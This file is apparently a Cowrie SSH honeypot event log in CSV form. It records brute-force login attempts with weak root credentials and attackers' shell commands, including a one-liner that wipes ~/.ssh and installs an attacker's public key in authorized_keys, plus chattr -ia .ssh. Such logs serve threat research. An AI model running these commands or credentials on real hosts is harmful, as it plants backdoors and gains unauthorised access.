eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.command.input,51.159.54.22,,,,24dbc7631ab8,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-23T00:00:20.968834Z
cowrie.session.file_download,51.159.54.22,,,,24dbc7631ab8,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-23T00:00:21.110246Z
cowrie.log.closed,51.159.54.22,,,,24dbc7631ab8,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-23T00:00:21.110679Z
cowrie.session.connect,51.159.54.22,47820,172.233.154.19,2222,70d2f96fb825,ssh,,,,New connection: 51.159.54.22:47820 (172.233.154.19:2222) [session: 70d2f96fb825],localhost,2024-11-23T00:00:21.248515Z
cowrie.client.version,51.159.54.22,,,,70d2f96fb825,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:00:21.249039Z
cowrie.client.kex,51.159.54.22,,,,70d2f96fb825,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:00:21.386371Z
cowrie.login.failed,51.159.54.22,,,,70d2f96fb825,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-23T00:00:21.976331Z
cowrie.session.closed,51.159.54.22,,,,70d2f96fb825,,,,,Connection lost after 1 seconds,localhost,2024-11-23T00:00:23.115378Z
cowrie.session.connect,51.159.54.22,48200,172.233.154.19,2222,f2ec9dda4a2f,ssh,,,,New connection: 51.159.54.22:48200 (172.233.154.19:2222) [session: f2ec9dda4a2f],localhost,2024-11-23T00:00:23.250973Z
cowrie.client.version,51.159.54.22,,,,f2ec9dda4a2f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:00:23.251458Z
cowrie.client.kex,51.159.54.22,,,,f2ec9dda4a2f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:00:23.389449Z
cowrie.login.success,51.159.54.22,,,,f2ec9dda4a2f,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-23T00:00:23.982317Z
cowrie.session.closed,51.159.54.22,,,,f2ec9dda4a2f,,,,,Connection lost after 0 seconds,localhost,2024-11-23T00:00:24.121173Z
cowrie.session.closed,51.159.54.22,,,,24dbc7631ab8,,,,,Connection lost after 4 seconds,localhost,2024-11-23T00:00:24.121758Z
cowrie.session.connect,120.35.26.129,18381,172.233.154.19,2222,b11ef0194706,ssh,,,,New connection: 120.35.26.129:18381 (172.233.154.19:2222) [session: b11ef0194706],localhost,2024-11-23T00:01:02.715997Z
cowrie.client.version,120.35.26.129,,,,b11ef0194706,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:01:02.716577Z
cowrie.client.kex,120.35.26.129,,,,b11ef0194706,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:01:02.883508Z
cowrie.login.failed,120.35.26.129,,,,b11ef0194706,,,,,login attempt [admin/khosrow] failed,localhost,2024-11-23T00:01:03.591423Z
cowrie.session.closed,120.35.26.129,,,,b11ef0194706,,,,,Connection lost after 2 seconds,localhost,2024-11-23T00:01:04.760532Z
cowrie.session.connect,138.68.144.133,43048,172.233.154.19,2222,794319962528,ssh,,,,New connection: 138.68.144.133:43048 (172.233.154.19:2222) [session: 794319962528],localhost,2024-11-23T00:01:05.971494Z
cowrie.client.version,138.68.144.133,,,,794319962528,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-23T00:01:05.972022Z
cowrie.client.kex,138.68.144.133,,,,794319962528,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-11-23T00:01:06.102542Z
cowrie.login.failed,138.68.144.133,,,,794319962528,,,,,login attempt [oracle/1qaz@WSX3edc] failed,localhost,2024-11-23T00:01:06.496667Z
cowrie.session.closed,138.68.144.133,,,,794319962528,,,,,Connection lost after 1 seconds,localhost,2024-11-23T00:01:07.629235Z
cowrie.session.connect,23.26.147.149,47766,172.233.154.19,2222,6ecac172e8bf,ssh,,,,New connection: 23.26.147.149:47766 (172.233.154.19:2222) [session: 6ecac172e8bf],localhost,2024-11-23T00:01:28.325062Z
cowrie.client.version,23.26.147.149,,,,6ecac172e8bf,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:01:28.325744Z
cowrie.client.kex,23.26.147.149,,,,6ecac172e8bf,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:01:28.339609Z
cowrie.login.failed,23.26.147.149,,,,6ecac172e8bf,,,,,login attempt [oracle/elcaro] failed,localhost,2024-11-23T00:01:28.434799Z
cowrie.session.closed,23.26.147.149,,,,6ecac172e8bf,,,,,Connection lost after 1 seconds,localhost,2024-11-23T00:01:29.451284Z
cowrie.session.connect,80.227.238.170,47620,172.233.154.19,2222,81c23974cda7,ssh,,,,New connection: 80.227.238.170:47620 (172.233.154.19:2222) [session: 81c23974cda7],localhost,2024-11-23T00:01:32.518566Z
cowrie.client.version,80.227.238.170,,,,81c23974cda7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:01:32.519189Z
cowrie.client.kex,80.227.238.170,,,,81c23974cda7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:01:32.779616Z
cowrie.login.failed,80.227.238.170,,,,81c23974cda7,,,,,login attempt [user14/user14123] failed,localhost,2024-11-23T00:01:33.859422Z
cowrie.session.closed,80.227.238.170,,,,81c23974cda7,,,,,Connection lost after 2 seconds,localhost,2024-11-23T00:01:35.120881Z
cowrie.session.connect,187.95.160.53,37988,172.233.154.19,2222,8cd6e0fb256a,ssh,,,,New connection: 187.95.160.53:37988 (172.233.154.19:2222) [session: 8cd6e0fb256a],localhost,2024-11-23T00:01:49.794557Z
cowrie.client.version,187.95.160.53,,,,8cd6e0fb256a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:01:49.795164Z
cowrie.client.kex,187.95.160.53,,,,8cd6e0fb256a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:01:49.979808Z
cowrie.session.connect,64.227.137.31,59444,172.233.154.19,2222,a10edc2561e7,ssh,,,,New connection: 64.227.137.31:59444 (172.233.154.19:2222) [session: a10edc2561e7],localhost,2024-11-23T00:01:50.587543Z
cowrie.client.version,64.227.137.31,,,,a10edc2561e7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:01:50.588160Z
cowrie.login.failed,187.95.160.53,,,,8cd6e0fb256a,,,,,login attempt [user39/user39123] failed,localhost,2024-11-23T00:01:50.750509Z
cowrie.client.kex,64.227.137.31,,,,a10edc2561e7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:01:50.794699Z
cowrie.login.failed,64.227.137.31,,,,a10edc2561e7,,,,,login attempt [user/demo12345678] failed,localhost,2024-11-23T00:01:51.662264Z
cowrie.session.closed,187.95.160.53,,,,8cd6e0fb256a,,,,,Connection lost after 2 seconds,localhost,2024-11-23T00:01:51.938604Z
cowrie.session.closed,64.227.137.31,,,,a10edc2561e7,,,,,Connection lost after 2 seconds,localhost,2024-11-23T00:01:52.871191Z
cowrie.session.connect,105.96.11.65,60898,172.233.154.19,2222,a7cbc84fa69c,ssh,,,,New connection: 105.96.11.65:60898 (172.233.154.19:2222) [session: a7cbc84fa69c],localhost,2024-11-23T00:02:27.886533Z
cowrie.client.version,105.96.11.65,,,,a7cbc84fa69c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:02:27.887367Z
cowrie.client.kex,105.96.11.65,,,,a7cbc84fa69c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:02:28.085981Z
cowrie.login.success,105.96.11.65,,,,a7cbc84fa69c,,,,,login attempt [root/passWord.*] succeeded,localhost,2024-11-23T00:02:28.917400Z
cowrie.session.params,105.96.11.65,,,,a7cbc84fa69c,,,,,[],localhost,2024-11-23T00:02:29.331571Z
cowrie.command.input,105.96.11.65,,,,a7cbc84fa69c,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-23T00:02:29.332032Z
cowrie.command.failed,105.96.11.65,,,,a7cbc84fa69c,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-23T00:02:29.332670Z
cowrie.log.closed,105.96.11.65,,,,a7cbc84fa69c,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-23T00:02:29.768560Z
cowrie.session.params,105.96.11.65,,,,a7cbc84fa69c,,,,,[],localhost,2024-11-23T00:02:30.020512Z
cowrie.command.input,105.96.11.65,,,,a7cbc84fa69c,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-23T00:02:30.020887Z
cowrie.session.file_download,105.96.11.65,,,,a7cbc84fa69c,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-23T00:02:30.220494Z
cowrie.log.closed,105.96.11.65,,,,a7cbc84fa69c,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-23T00:02:30.221007Z
cowrie.session.connect,105.96.11.65,33172,172.233.154.19,2222,99e1bcd7fda7,ssh,,,,New connection: 105.96.11.65:33172 (172.233.154.19:2222) [session: 99e1bcd7fda7],localhost,2024-11-23T00:02:30.372124Z
cowrie.client.version,105.96.11.65,,,,99e1bcd7fda7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:02:30.372553Z
cowrie.client.kex,105.96.11.65,,,,99e1bcd7fda7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-23T00:02:30.547310Z
cowrie.login.failed,105.96.11.65,,,,99e1bcd7fda7,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-23T00:02:31.284734Z
cowrie.session.closed,105.96.11.65,,,,99e1bcd7fda7,,,,,Connection lost after 2 seconds,localhost,2024-11-23T00:02:32.463329Z
cowrie.session.connect,105.96.11.65,33706,172.233.154.19,2222,a174d92bfebb,ssh,,,,New connection: 105.96.11.65:33706 (172.233.154.19:2222) [session: a174d92bfebb],localhost,2024-11-23T00:02:39.712203Z
cowrie.client.version,105.96.11.65,,,,a174d92bfebb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-23T00:02:39.712797Z
